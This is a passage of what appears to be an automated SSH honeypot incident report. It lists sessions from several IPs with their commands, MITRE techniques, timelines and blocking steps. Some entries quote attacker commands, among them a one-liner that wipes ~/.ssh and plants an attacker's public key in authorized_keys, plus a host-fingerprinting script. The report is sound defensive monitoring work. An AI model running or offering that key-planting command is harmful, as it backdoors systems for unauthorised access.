| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:00:03` | `cowrie.session.connect` |
| `2026-07-01 16:00:03` | `cowrie.client.version` |
| `2026-07-01 16:00:03` | `cowrie.client.kex` |
| `2026-07-01 16:00:03` | `cowrie.login.success` |
| `2026-07-01 16:00:04` | `cowrie.session.params` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.command.success` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.command.input` |
| `2026-07-01 16:00:04` | `cowrie.log.closed` |
| `2026-07-01 16:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74d79ad409b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:06 |
| **Last Seen** | 2026-07-01 16:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:06:34` | `cowrie.session.connect` |
| `2026-07-01 16:06:34` | `cowrie.client.version` |
| `2026-07-01 16:06:34` | `cowrie.client.kex` |
| `2026-07-01 16:06:34` | `cowrie.login.success` |
| `2026-07-01 16:06:35` | `cowrie.session.params` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.command.success` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.command.input` |
| `2026-07-01 16:06:35` | `cowrie.log.closed` |
| `2026-07-01 16:06:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a5d95fcbe35

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 16:07 |
| **Last Seen** | 2026-07-01 16:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:07:43` | `cowrie.session.connect` |
| `2026-07-01 16:07:44` | `cowrie.client.version` |
| `2026-07-01 16:07:44` | `cowrie.client.kex` |
| `2026-07-01 16:07:51` | `cowrie.login.success` |
| `2026-07-01 16:07:54` | `cowrie.session.params` |
| `2026-07-01 16:07:54` | `cowrie.command.input` |
| `2026-07-01 16:07:56` | `cowrie.log.closed` |
| `2026-07-01 16:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0987dce687

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 16:10 |
| **Last Seen** | 2026-07-01 16:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:10:03` | `cowrie.session.connect` |
| `2026-07-01 16:10:04` | `cowrie.client.version` |
| `2026-07-01 16:10:04` | `cowrie.client.kex` |
| `2026-07-01 16:10:05` | `cowrie.login.success` |
| `2026-07-01 16:10:07` | `cowrie.session.params` |
| `2026-07-01 16:10:07` | `cowrie.command.input` |
| `2026-07-01 16:10:07` | `cowrie.log.closed` |
| `2026-07-01 16:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0342b450579

| Field | Detail |
|---|---|
| **Source IP** | `210.79.190[.]151` |
| **First Seen** | 2026-07-01 16:12 |
| **Last Seen** | 2026-07-01 16:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:12:03` | `cowrie.session.connect` |
| `2026-07-01 16:12:03` | `cowrie.client.version` |
| `2026-07-01 16:12:03` | `cowrie.client.kex` |
| `2026-07-01 16:12:04` | `cowrie.login.success` |
| `2026-07-01 16:12:05` | `cowrie.session.params` |
| `2026-07-01 16:12:05` | `cowrie.command.input` |
| `2026-07-01 16:12:05` | `cowrie.command.failed` |
| `2026-07-01 16:12:06` | `cowrie.log.closed` |
| `2026-07-01 16:12:06` | `cowrie.session.params` |
| `2026-07-01 16:12:06` | `cowrie.command.input` |
| `2026-07-01 16:12:07` | `cowrie.session.file_download` |
| `2026-07-01 16:12:07` | `cowrie.log.closed` |
| `2026-07-01 16:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.190[.]151` to AbuseIPDB if not already reported
- [ ] Block `210.79.190[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-696342d56c9c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:12 |
| **Last Seen** | 2026-07-01 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:12:07` | `cowrie.session.connect` |
| `2026-07-01 16:12:07` | `cowrie.client.version` |
| `2026-07-01 16:12:07` | `cowrie.client.kex` |
| `2026-07-01 16:12:07` | `cowrie.login.success` |
| `2026-07-01 16:12:08` | `cowrie.session.params` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.command.success` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.command.input` |
| `2026-07-01 16:12:08` | `cowrie.log.closed` |
| `2026-07-01 16:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0429d0631d03

| Field | Detail |
|---|---|
| **Source IP** | `210.79.190[.]151` |
| **First Seen** | 2026-07-01 16:12 |
| **Last Seen** | 2026-07-01 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:12:07` | `cowrie.session.connect` |
| `2026-07-01 16:12:07` | `cowrie.client.version` |
| `2026-07-01 16:12:07` | `cowrie.client.kex` |
| `2026-07-01 16:12:09` | `cowrie.login.success` |
| `2026-07-01 16:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.190[.]151` to AbuseIPDB if not already reported
- [ ] Block `210.79.190[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e598fbef80e

| Field | Detail |
|---|---|
| **Source IP** | `210.79.190[.]151` |
| **First Seen** | 2026-07-01 16:12 |
| **Last Seen** | 2026-07-01 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:12:09` | `cowrie.session.connect` |
| `2026-07-01 16:12:09` | `cowrie.client.version` |
| `2026-07-01 16:12:09` | `cowrie.client.kex` |
| `2026-07-01 16:12:10` | `cowrie.login.success` |
| `2026-07-01 16:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.190[.]151` to AbuseIPDB if not already reported
- [ ] Block `210.79.190[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d6670c9e5d

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:22` | `cowrie.login.success` |
| `2026-07-01 16:16:23` | `cowrie.session.params` |
| `2026-07-01 16:16:29` | `cowrie.log.closed` |
| `2026-07-01 16:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2d8b3daf91a

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `busybox TEST` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:21` | `cowrie.login.success` |
| `2026-07-01 16:16:21` | `cowrie.session.params` |
| `2026-07-01 16:16:26` | `cowrie.command.input` |
| `2026-07-01 16:16:26` | `cowrie.log.closed` |
| `2026-07-01 16:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edeeca7a763a

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:20` | `cowrie.login.success` |
| `2026-07-01 16:16:21` | `cowrie.session.params` |
| `2026-07-01 16:16:26` | `cowrie.log.closed` |
| `2026-07-01 16:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ea3e79ca13

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:23` | `cowrie.login.success` |
| `2026-07-01 16:16:23` | `cowrie.session.params` |
| `2026-07-01 16:16:26` | `cowrie.log.closed` |
| `2026-07-01 16:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e99663a0ec1

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:21` | `cowrie.login.success` |
| `2026-07-01 16:16:22` | `cowrie.session.params` |
| `2026-07-01 16:16:26` | `cowrie.log.closed` |
| `2026-07-01 16:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecc593b20a26

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:23` | `cowrie.login.success` |
| `2026-07-01 16:16:24` | `cowrie.session.params` |
| `2026-07-01 16:16:26` | `cowrie.log.closed` |
| `2026-07-01 16:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f06ce5f493d7

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:25` | `cowrie.login.success` |
| `2026-07-01 16:16:26` | `cowrie.session.params` |
| `2026-07-01 16:16:26` | `cowrie.log.closed` |
| `2026-07-01 16:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b85e759119

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:24` | `cowrie.login.success` |
| `2026-07-01 16:16:25` | `cowrie.session.params` |
| `2026-07-01 16:16:26` | `cowrie.log.closed` |
| `2026-07-01 16:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e5ded49f359

| Field | Detail |
|---|---|
| **Source IP** | `141.11.88[.]108` |
| **First Seen** | 2026-07-01 16:16 |
| **Last Seen** | 2026-07-01 16:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:16:18` | `cowrie.session.connect` |
| `2026-07-01 16:16:25` | `cowrie.login.success` |
| `2026-07-01 16:16:25` | `cowrie.session.params` |
| `2026-07-01 16:16:26` | `cowrie.log.closed` |
| `2026-07-01 16:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.88[.]108` to AbuseIPDB if not already reported
- [ ] Block `141.11.88[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-654166af81aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:17 |
| **Last Seen** | 2026-07-01 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:17:35` | `cowrie.session.connect` |
| `2026-07-01 16:17:35` | `cowrie.client.version` |
| `2026-07-01 16:17:35` | `cowrie.client.kex` |
| `2026-07-01 16:17:36` | `cowrie.login.success` |
| `2026-07-01 16:17:36` | `cowrie.session.params` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.command.success` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.command.input` |
| `2026-07-01 16:17:36` | `cowrie.log.closed` |
| `2026-07-01 16:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effa47eb530a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 16:20 |
| **Last Seen** | 2026-07-01 16:20 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:20:00` | `cowrie.session.connect` |
| `2026-07-01 16:20:01` | `cowrie.client.version` |
| `2026-07-01 16:20:01` | `cowrie.client.kex` |
| `2026-07-01 16:20:07` | `cowrie.login.success` |
| `2026-07-01 16:20:12` | `cowrie.session.params` |
| `2026-07-01 16:20:12` | `cowrie.command.input` |
| `2026-07-01 16:20:13` | `cowrie.log.closed` |
| `2026-07-01 16:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d617529af8

| Field | Detail |
|---|---|
| **Source IP** | `66.154.109[.]226` |
| **First Seen** | 2026-07-01 16:21 |
| **Last Seen** | 2026-07-01 16:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:21:33` | `cowrie.session.connect` |
| `2026-07-01 16:21:33` | `cowrie.client.version` |
| `2026-07-01 16:21:33` | `cowrie.client.kex` |
| `2026-07-01 16:21:33` | `cowrie.login.success` |
| `2026-07-01 16:21:34` | `cowrie.session.params` |
| `2026-07-01 16:21:34` | `cowrie.command.input` |
| `2026-07-01 16:21:34` | `cowrie.command.failed` |
| `2026-07-01 16:21:34` | `cowrie.log.closed` |
| `2026-07-01 16:21:35` | `cowrie.session.params` |
| `2026-07-01 16:21:35` | `cowrie.command.input` |
| `2026-07-01 16:21:35` | `cowrie.session.file_download` |
| `2026-07-01 16:21:35` | `cowrie.log.closed` |
| `2026-07-01 16:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.154.109[.]226` to AbuseIPDB if not already reported
- [ ] Block `66.154.109[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b909f3e5d7

| Field | Detail |
|---|---|
| **Source IP** | `66.154.109[.]226` |
| **First Seen** | 2026-07-01 16:21 |
| **Last Seen** | 2026-07-01 16:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:21:35` | `cowrie.session.connect` |
| `2026-07-01 16:21:35` | `cowrie.client.version` |
| `2026-07-01 16:21:35` | `cowrie.client.kex` |
| `2026-07-01 16:21:35` | `cowrie.login.success` |
| `2026-07-01 16:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.154.109[.]226` to AbuseIPDB if not already reported
- [ ] Block `66.154.109[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb6ea735da1

| Field | Detail |
|---|---|
| **Source IP** | `66.154.109[.]226` |
| **First Seen** | 2026-07-01 16:21 |
| **Last Seen** | 2026-07-01 16:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:21:35` | `cowrie.session.connect` |
| `2026-07-01 16:21:35` | `cowrie.client.version` |
| `2026-07-01 16:21:35` | `cowrie.client.kex` |
| `2026-07-01 16:21:35` | `cowrie.login.success` |
| `2026-07-01 16:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.154.109[.]226` to AbuseIPDB if not already reported
